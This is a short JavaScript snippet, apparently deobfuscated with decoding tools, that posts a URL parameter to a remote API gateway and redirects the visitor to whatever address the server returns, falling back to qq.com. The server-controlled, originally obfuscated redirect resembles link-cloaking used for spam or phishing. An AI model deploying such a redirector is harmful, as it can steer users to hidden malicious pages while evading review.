//Tue Apr 15 2025 05:29:25 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
if ($_GET.dd) {
  const httpRequest = new XMLHttpRequest();
  httpRequest.open("POST", "https://service-mapxuh3j-1304283708.bj.apigw.tencentcs.com/api/read");
  httpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  httpRequest.send("dd=" + $_GET.dd);
  httpRequest.onreadystatechange = function () {
    httpRequest.readyState === 4 && httpRequest.status === 200 && (self.location.href = httpRequest.responseText);
  };
} else self.location.href = "https://www.qq.com";